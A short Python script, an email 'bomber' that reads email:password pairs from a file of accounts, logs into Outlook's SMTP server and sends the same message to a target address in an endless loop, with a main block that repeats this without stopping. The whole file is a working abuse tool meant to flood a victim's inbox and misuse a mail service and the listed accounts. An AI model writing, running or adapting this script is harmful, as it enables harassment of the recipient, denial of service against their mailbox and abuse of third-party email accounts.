import os, sys, random, smtplib, time

class Bomb():
	def getAccount():
		return random.choice(list(open('accounts.txt')))

	def bombMail(mail, message):
		account = Bomb.getAccount()
		email = account.split(":")[0]
		pwd = account.split(":")[1]

		sending = True
		server = smtplib.SMTP("smtp-mail.outlook.com", 587)
		server.ehlo()
		server.starttls()
		try:
			server.login(email, pwd)
		except smtplib.SMTPAuthenticationError:
			print('[!] Incorrect credentials.')
			pass
		while sending == True:
			try:
				server.sendmail(email, mail, message)
				print('[+] Mail sent..')
				time.sleep(.8)
			except KeyboardInterrupt:
				print('\n[!] Stopped..')
				pass
			except smtplib.SMTPAuthenticationError:
				print("\n[!] Auth error..")
				pass
			except:
				print("[!] A mail wasn't sent..")
		server.close()

if __name__ == "__main__":
	while True:
		Bomb.bombMail("dummy-mail@hotmail.com", "Mail Spammer :o")
